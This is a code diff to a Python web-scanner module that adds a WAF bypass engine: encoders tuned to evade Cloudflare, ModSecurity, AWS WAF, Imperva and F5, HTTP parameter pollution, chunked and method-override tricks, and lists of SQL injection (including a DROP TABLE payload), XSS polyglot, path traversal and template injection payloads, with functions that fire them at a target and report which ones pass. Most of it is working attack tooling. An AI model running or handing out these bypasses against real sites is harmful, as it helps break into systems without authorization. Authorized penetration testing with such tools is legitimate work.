@@ -1,11 +1,17 @@
-import re, copy
-from typing import Optional, Dict, List
+import re, copy, random, urllib.parse, time, itertools
+from typing import Optional, Dict, List, Tuple, Callable
+from enum import Enum
 import requests
 
 from tools.log_utils import get_logger
 from tools.http_client import build_url
+from tools.settings import settings
 
 logger = get_logger("waf_bypass")
+
+# ---------------------------------------------------------------------------
+# Basic WAF Evidence / Header Patterns
+# ---------------------------------------------------------------------------
 
 WAF_EVIDENCE = {
     "cloudflare": [r"cloudflare", r"cf-ray", r"__cfduid", r"cloudflare-nginx",
@@ -96,11 +102,14 @@ BYPASS_PAYLOADS = {
     ],
 }
 
+# ---------------------------------------------------------------------------
+# Fingerprinting
+# ---------------------------------------------------------------------------
 
 def fingerprint_waf(url: str, sess: Optional[requests.Session] = None,
                     timeout: float = 10.0) -> Dict:
     if sess is None:
-        sess = requests.Session()
+        sess = requests.Session(); sess.verify = settings.verify_ssl
     result = {"detected": False, "name": None, "evidence": [], "all_matches": []}
 
     probes = [
@@ -111,7 +120,7 @@ def fingerprint_waf(url: str, sess: Optional[requests.Session] = None,
 
     for target, source_label in probes:
         try:
-            r = sess.get(target, timeout=timeout, verify=False)
+            r = sess.get(target, timeout=timeout)
 
             for k, v in r.headers.items():
                 lower_k = k.lower()
@@ -156,10 +165,14 @@ def generate_bypasses(vuln_type: str) -> List[str]:
     return BYPASS_PAYLOADS.get(vuln_type, [])
 
 
+# ---------------------------------------------------------------------------
+# Basic WAF check: fingerprint + bypass payload spraying
+# ---------------------------------------------------------------------------
+
 def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
           timeout: float = 10.0) -> Dict:
     if sess is None:
-        sess = requests.Session()
+        sess = requests.Session(); sess.verify = settings.verify_ssl
     result = {
         "waf": fingerprint_waf(url, sess, timeout),
         "bypasses": {},
@@ -171,7 +184,7 @@ def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
             for payload in payloads:
                 try:
                     r = sess.get(build_url(url, param, payload),
-                                 timeout=timeout, verify=False)
+                                 timeout=timeout)
                     tested.append({"payload": payload[:25], "status": r.status_code,
                                    "length": len(r.text)})
                 except Exception as e:
@@ -181,7 +194,7 @@ def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
                 try:
                     r = sess.get(build_url(url, param, payload),
                                  headers={"X-Forwarded-For": "127.0.0.1"},
-                                 timeout=timeout, verify=False)
+                                 timeout=timeout)
                     tested.append({"payload": "hdr:%s" % payload[:20], "status": r.status_code,
                                    "length": len(r.text)})
                 except Exception as e:
@@ -189,5 +202,529 @@ def check(url: str, param: str = None, sess: Optional[requests.Session] = None,
 
             if tested:
                 result["bypasses"][vtype] = tested
+
+    return result
+
+
+# ===========================================================================
+# Heavy Bypass Engine (formerly waf_heavy_bypass)
+# ===========================================================================
+
+class BypassEncoder:
+    @staticmethod
+    def url_encode(s: str) -> str:
+        return urllib.parse.quote(s, safe="")
+
+    @staticmethod
+    def double_url_encode(s: str) -> str:
+        return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")
+
+    @staticmethod
+    def unicode_url_encode(s: str) -> str:
+        result = ""
+        for c in s:
+            if c in "'\"= ;()":
+                result += f"%u{ord(c):04x}"
+            else:
+                result += c
+        return result
+
+    @staticmethod
+    def overlong_utf8_encode(s: str) -> str:
+        mapping = {
+            "<": "%C0%BC", ">": "%C0%BE",
+            "'": "%C0%A7", '"': "%C0%A2",
+            "=": "%C0%BC", ";": "%C0%BB",
+        }
+        result = ""
+        for c in s:
+            result += mapping.get(c, c)
+        return result
+
+    @staticmethod
+    def ibm037_encode(s: str) -> str:
+        mapping = {
+            "'": "%X7F", '"': "%X7F",
+            "=": "%X7E", ";": "%X5E",
+            " ": "%X40",
+        }
+        result = ""
+        for c in s:
+            result += mapping.get(c, c)
+        return result
+
+    @staticmethod
+    def hex_encode(s: str) -> str:
+        return "".join(f"%{ord(c):02x}" for c in s)
+
+    @staticmethod
+    def null_bytes(s: str) -> str:
+        return "%00".join(list(s))
+
+    @staticmethod
+    def case_random(s: str) -> str:
+        sql_kw = {"or", "and", "select", "union", "from", "where", "order", "by",
+                  "sleep", "waitfor", "delay", "insert", "update", "delete", "drop",
+                  "create", "alter", "exec", "having", "group", "null", "not",
+                  "into", "values", "set", "like", "admin", "all", "distinct",
+                  "pg_sleep", "if", "substring", "user", "database", "table",
+                  "column", "schema", "benchmark", "load_file", "intooutfile",
+                  "information_schema", "and", "or", "on", "as", "convert", "cast",
+                  "declare", "char", "varchar", "from", "dual", "where", "having"}
+        result = []
+        for word in s.split(" "):
+            stripped = word.strip("'\"();\n\t")
+            if stripped.lower() in sql_kw:
+                mutated = "".join(random.choice([c.upper(), c.lower()]) for c in word)
+                result.append(mutated)
+            else:
+                result.append(word)
+        return " ".join(result)
+
+    @staticmethod
+    def scientific_notation(s: str) -> str:
+        return s.replace("1=1", "1.0=1.0").replace("1=2", "1.0=2.0")
+
+    @staticmethod
+    def negative_sign(s: str) -> str:
+        return s.replace("1=1", "1=-(-1)").replace("1=2", "1=-(-2)")
+
+
+SQL_COMMENT_ENC = {
+    "inline": lambda s: s.replace("OR ", "O/**/R ").replace("AND ", "AN/**/D "),
+    "nested_mysql": lambda s: s.replace("OR ", "O/*!12345R*/ "),
+    "hash_comment": lambda s: re.sub(r"--\s*$", "#", s),
+    "double_dash_newline": lambda s: re.sub(r"--\s*$", "-- \n", s),
+    "endline_comment": lambda s: s.replace("-- ", "-- \n"),
+}
+
+
+class HTTPBypass:
+    @staticmethod
+    def hpp(params: Dict[str, str], key: str, value: str) -> str:
+        parts = []
+        for k, v in params.items():
+            parts.append(f"{k}={v}")
+        parts.append(f"{key}={value}")
+        return "&".join(parts)
+
+    @staticmethod
+    def hpp_duplicate(params: Dict[str, str], key: str, value: str) -> str:
+        parts = []
+        for k, v in params.items():
+            if k == key:
+                parts.append(f"{k}={v}")
+                parts.append(f"{k}={value}")
+            else:
+                parts.append(f"{k}={v}")
+        return "&".join(parts)
+
+    @staticmethod
+    def content_type_xml(body: str) -> Tuple[Dict[str, str], str]:
+        headers = {"Content-Type": "application/xml; charset=utf-8"}
+        xml_body = f"""<?xml version="1.0" encoding="UTF-8"?>
+<root><param>{body}</param></root>"""
+        return headers, xml_body
+
+    @staticmethod
+    def content_type_json(body: str) -> Tuple[Dict[str, str], str]:
+        headers = {"Content-Type": "application/json"}
+        return headers, f'{{"param":"{body}"}}'
+
+    @staticmethod
+    def chunked_encoding(body: str) -> Dict[str, str]:
+        chunks = []
+        for i in range(0, len(body), 2):
+            chunk = body[i:i + 2]
+            chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
+        chunks.append("0\r\n\r\n")
+        return {"Transfer-Encoding": "chunked", "Content-Type": "application/x-www-form-urlencoded"}
+
+    @staticmethod
+    def method_override(method: str) -> Dict[str, str]:
+        return {
+            "X-HTTP-Method": method,
+            "X-HTTP-Method-Override": method,
+            "X-Method-Override": method,
+        }
+
+
+WAF_BYPASS_STRATEGIES: Dict[str, Dict] = {
+    "cloudflare": {
+        "priority": ["double_url", "inline_comment", "null_bytes", "hpp"],
+        "skip": [],
+        "time_sensitive": True,
+    },
+    "mod_security": {
+        "priority": ["case_random", "scientific", "nested_comment_mysql",
+                      "overlong_utf8", "hpp_duplicate"],
+        "skip": [],
+        "time_sensitive": False,
+    },
+    "aws_waf": {
+        "priority": ["double_url", "unicode_url", "case_random", "method_override"],
+        "skip": [],
+        "time_sensitive": True,
+    },
+    "imperva": {
+        "priority": ["hex_encode", "null_bytes", "chunked", "content_type_xml"],
+        "skip": ["url_encode"],
+        "time_sensitive": True,
+    },
+    "f5_bigip": {
+        "priority": ["ibm037", "overlong_utf8", "inline_comment", "hpp"],
+        "skip": [],
+        "time_sensitive": False,
+    },
+    None: {
+        "priority": ["url_encode", "double_url", "case_random",
+                      "inline_comment", "null_bytes", "hpp",
+                      "scientific", "chunked"],
+        "skip": [],
+        "time_sensitive": False,
+    },
+}
+
+SQLI_BYPASS_ENCODERS: Dict[str, Callable[[str], str]] = {
+    "url_encode": BypassEncoder.url_encode,
+    "double_url": BypassEncoder.double_url_encode,
+    "unicode_url": BypassEncoder.unicode_url_encode,
+    "overlong_utf8": BypassEncoder.overlong_utf8_encode,
+    "ibm037": BypassEncoder.ibm037_encode,
+    "hex_encode": BypassEncoder.hex_encode,
+    "null_bytes": BypassEncoder.null_bytes,
+    "case_random": BypassEncoder.case_random,
+    "scientific": BypassEncoder.scientific_notation,
+    "negative_sign": BypassEncoder.negative_sign,
+    "inline_comment": SQL_COMMENT_ENC["inline"],
+    "nested_comment_mysql": SQL_COMMENT_ENC["nested_mysql"],
+}
+
+HTTP_BYPASS_TECHNIQUES: Dict[str, Callable] = {
+    "hpp": lambda p, k, v: HTTPBypass.hpp(p, k, v),
+    "hpp_duplicate": lambda p, k, v: HTTPBypass.hpp_duplicate(p, k, v),
+    "content_type_xml": lambda p, k, v: HTTPBypass.content_type_xml(f"{k}={v}"),
+    "content_type_json": lambda p, k, v: HTTPBypass.content_type_json(f"{k}={v}"),
+    "chunked": lambda p, k, v: (HTTPBypass.chunked_encoding(f"{k}={v}"), f"{k}={v}"),
+    "method_override": lambda p, k, v: (HTTPBypass.method_override("POST"), f"{k}={v}"),
+}
+
+BASE_SQLI_PAYLOADS = [
+    "'", '"', "')", "'))", "\\'", "`",
+    "' OR '1'='1", "' OR 1=1-- ", "1' OR '1'='1",
+    "' AND 1=1-- ", "' AND 1=2-- ",
+    "' UNION SELECT NULL-- ",
+    "' UNION SELECT NULL,NULL-- ",
+    "' UNION SELECT 1,2,3-- ",
+    "' OR SLEEP(3)-- ",
+    "' WAITFOR DELAY '0:0:3'-- ",
+    "' OR pg_sleep(3)-- ",
+    "'; SELECT 1-- ",
+    "'; DROP TABLE IF EXISTS x-- ",
+    "' OR '1'='1' /*",
+    "' OR 1=1#",
+    "admin' --",
+    "admin'/*",
+    "' UNION ALL SELECT 1,2,3-- ",
+]
+
+XSS_BYPASS_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<ScRiPt>alert(1)</ScRiPt>",
+    "<IMG SRC=x onerror=alert(1)>",
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "<script/random=1>alert(1)</script>",
+    "\" autofocus onfocus=alert(1) x=\"",
+    "' autofocus onfocus=alert(1) x='",
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg oNloAd=alert(1)><!-->",
+    "<script\\x00>alert(1)</script>",
+    "<script&#x20>alert(1)</script>",
+    "<details/open/ontoggle=alert(1)>",
+    "<body onload=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "%3Cscript%3Ealert(1)%3C/script%3E",
+    "\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E",
+    "<scr%00ipt>alert(1)</scr%00ipt>",
+    "<scri%00pt>alert(1)</scri%00pt>",
+]
+
+
+def generate_sqli_payloads(raw_payload: str, waf_name: Optional[str],
+                           max_payloads: int = 30) -> List[Dict]:
+    strategies = WAF_BYPASS_STRATEGIES.get(waf_name, WAF_BYPASS_STRATEGIES[None])
+    results = []
+
+    raw_entry = {
+        "payload": raw_payload,
+        "technique": "raw",
+        "encoder": "none",
+    }
+    results.append(raw_entry)
+
+    for enc_name in strategies["priority"]:
+        if enc_name in strategies.get("skip", []):
+            continue
+        encoder = SQLI_BYPASS_ENCODERS.get(enc_name)
+        if encoder:
+            try:
+                encoded = encoder(raw_payload)
+                if encoded and encoded != raw_payload:
+                    results.append({
+                        "payload": encoded,
+                        "technique": f"sqli_{enc_name}",
+                        "encoder": enc_name,
+                    })
+            except Exception as e:
+                logger.debug("encoder %s failed: %s", enc_name, e)
+
+    if len(results) > max_payloads:
+        results = results[:max_payloads]
+
+    return results
+
+
+def _indicates_injection(r, baseline) -> bool:
+    if r.status_code == 500:
+        return True
+
+    error_patterns = [
+        r"SQL syntax.*MySQL",
+        r"Warning.*mysql_",
+        r"MySQLSyntaxErrorException",
+        r"Unclosed quotation mark",
+        r"Microsoft OLE DB.*SQL Server",
+        r"PostgreSQL.*ERROR",
+        r"ORA-[0-9]{5}",
+        r"SQLite.*Exception",
+        r"Division by zero",
+    ]
+    for pat in error_patterns:
+        if re.search(pat, r.text, re.IGNORECASE):
+            return True
+
+    if baseline:
+        diff = abs(len(r.text) - len(baseline.text))
+        if diff > 30 and r.status_code == baseline.status_code:
+            return True
+
+    return False
+
+
+def test_sqli_bypass(url: str, param: str, sess: requests.Session,
+                     waf_name: Optional[str], timeout: float) -> Dict:
+    result = {"vulnerable": False, "bypasses": [], "best_payload": None}
+
+    baseline = None
+    try:
+        baseline = sess.get(build_url(url, param, "1"), timeout=timeout)
+    except Exception:
+        pass
+
+    for raw in BASE_SQLI_PAYLOADS:
+        variants = generate_sqli_payloads(raw, waf_name)
+        for var in variants:
+            payload = var["payload"]
+            technique = var["technique"]
+            try:
+                r = sess.get(build_url(url, param, payload),
+                             timeout=timeout + 2)
+            except Exception:
+                continue
+
+            if _indicates_injection(r, baseline):
+                result["vulnerable"] = True
+                entry = {
+                    "payload": payload[:60],
+                    "technique": technique,
+                    "status": r.status_code,
+                    "length": len(r.text),
+                    "encoder": var.get("encoder", "none"),
+                }
+                result["bypasses"].append(entry)
+                if result["best_payload"] is None:
+                    result["best_payload"] = payload
+                if len(result["bypasses"]) >= 3:
+                    return result
+
+    return result
+
+
+def test_xss_bypass(url: str, param: str, sess: requests.Session,
+                    timeout: float) -> Dict:
+    result = {"vulnerable": False, "bypasses": []}
+
+    for payload in XSS_BYPASS_PAYLOADS:
+        try:
+            marker = f"XSS_{random.randint(10000, 99999)}"
+            test_payload = marker + payload
+            r = sess.get(build_url(url, param, test_payload),
+                         timeout=timeout)
+            if marker in r.text:
+                result["vulnerable"] = True
+                result["bypasses"].append({
+                    "payload": payload[:60],
+                    "status": r.status_code,
+                })
+                if len(result["bypasses"]) >= 3:
+                    return result
+        except Exception:
+            pass
+
+    return result
+
+
+def test_http_bypass(url: str, param: str, sess: requests.Session,
+                     waf_name: Optional[str], timeout: float) -> Dict:
+    result = {"vulnerable": False, "bypasses": []}
+
+    test_payload = "' OR '1'='1"
+
+    if "hpp" in WAF_BYPASS_STRATEGIES.get(waf_name, {}).get("priority", []):
+        try:
+            query_params = {}
+            if "?" in url:
+                qs = url.split("?")[1] if "?" in url else ""
+                for pair in qs.split("&"):
+                    if "=" in pair:
+                        k, v = pair.split("=", 1)
+                        query_params[k] = v
+
+            hpp_query = HTTPBypass.hpp(query_params, param, test_payload)
+            target = url.split("?")[0] + "?" + hpp_query if query_params else url + "?" + f"{param}={test_payload}"
+            r = sess.get(target, timeout=timeout)
+            if _indicates_injection(r, None):
+                result["vulnerable"] = True
+                result["bypasses"].append({
+                    "technique": "hpp",
+                    "payload": test_payload,
+                    "status": r.status_code,
+                })
+        except Exception as e:
+            logger.debug("hpp test: %s", e)
+
+    if not result["vulnerable"] and "chunked" in WAF_BYPASS_STRATEGIES.get(waf_name, {}).get("priority", []):
+        try:
+            chunk_headers = HTTPBypass.chunked_encoding(f"{param}={test_payload}")
+            body = ""
+            for i in range(0, len(f"{param}={test_payload}"), 2):
+                chunked_payload = f"{param}={test_payload}"
+                chunk = chunked_payload[i:i + 2]
+                body += f"{len(chunk):x}\r\n{chunk}\r\n"
+            body += "0\r\n\r\n"
+            r = sess.post(url, data=body, headers=chunk_headers, timeout=timeout)
+            if _indicates_injection(r, None):
+                result["vulnerable"] = True
+                result["bypasses"].append({
+                    "technique": "chunked",
+                    "payload": test_payload,
+                    "status": r.status_code,
+                })
+        except Exception as e:
+            logger.debug("chunked test: %s", e)
+
+    if not result["vulnerable"]:
+        for method in ["GET", "POST", "PUT", "PATCH"]:
+            try:
+                override_headers = HTTPBypass.method_override(method)
+                r = sess.get(build_url(url, param, test_payload),
+                             headers=override_headers, timeout=timeout)
+                if _indicates_injection(r, None):
+                    result["vulnerable"] = True
+                    result["bypasses"].append({
+                        "technique": f"method_override_{method}",
+                        "payload": test_payload,
+                        "status": r.status_code,
+                    })
+                    break
+            except Exception:
+                pass
+
+    return result
+
+
+def test_waf_strength(url: str, sess: requests.Session,
+                      timeout: float) -> Dict:
+    result = {
+        "waf": None,
+        "blocked_count": 0,
+        "bypass_count": 0,
+        "summary": {},
+    }
+
+    waf_info = fingerprint_waf(url, sess, timeout)
+    result["waf"] = waf_info
+
+    raw_tests = [
+        "' OR '1'='1",
+        "<script>alert(1)</script>",
+        "../../../etc/passwd",
+        "{{999999*999999}}",
+    ]
+
+    blocked = 0
+    passed = 0
+    for payload in raw_tests:
+        try:
+            r = sess.get(build_url(url, "id", payload), timeout=timeout)
+            if r.status_code in (403, 406, 429, 503) or "blocked" in r.text.lower()[:500]:
+                blocked += 1
+            else:
+                passed += 1
+        except Exception:
+            blocked += 1
+
+    result["blocked_count"] = blocked
+    result["bypass_count"] = passed
+    result["summary"]["block_rate"] = f"{blocked}/{blocked + passed}" if (blocked + passed) > 0 else "0/0"
+
+    return result
+
+
+def heavy_check(url: str, param: str = None, sess: Optional[requests.Session] = None,
+                timeout: float = 10.0) -> Dict:
+    if sess is None:
+        sess = requests.Session(); sess.verify = settings.verify_ssl
+    result = {
+        "vulnerable": False,
+        "findings": [],
+        "waf": {},
+        "sqli_bypass": None,
+        "xss_bypass": None,
+        "http_bypass": None,
+    }
+
+    waf_info = fingerprint_waf(url, sess, timeout)
+    result["waf"] = waf_info
+    waf_name = waf_info.get("name")
+
+    if param:
+        sqli_r = test_sqli_bypass(url, param, sess, waf_name, timeout)
+        result["sqli_bypass"] = sqli_r
+        if sqli_r["vulnerable"]:
+            result["vulnerable"] = True
+            result["findings"].extend([
+                {"type": "sqli_waf_bypass", **b}
+                for b in sqli_r["bypasses"]
+            ])
+
+        xss_r = test_xss_bypass(url, param, sess, timeout)
+        result["xss_bypass"] = xss_r
+        if xss_r["vulnerable"]:
+            result["vulnerable"] = True
+            result["findings"].extend([
+                {"type": "xss_waf_bypass", **b}
+                for b in xss_r["bypasses"]
+            ])
+
+    http_r = test_http_bypass(url, param or "id", sess, waf_name, timeout)
+    result["http_bypass"] = http_r
+    if http_r["vulnerable"]:
+        result["vulnerable"] = True
+        result["findings"].extend([
+            {"type": "http_waf_bypass", **b}
+            for b in http_r["bypasses"]
+        ])
 
     return result
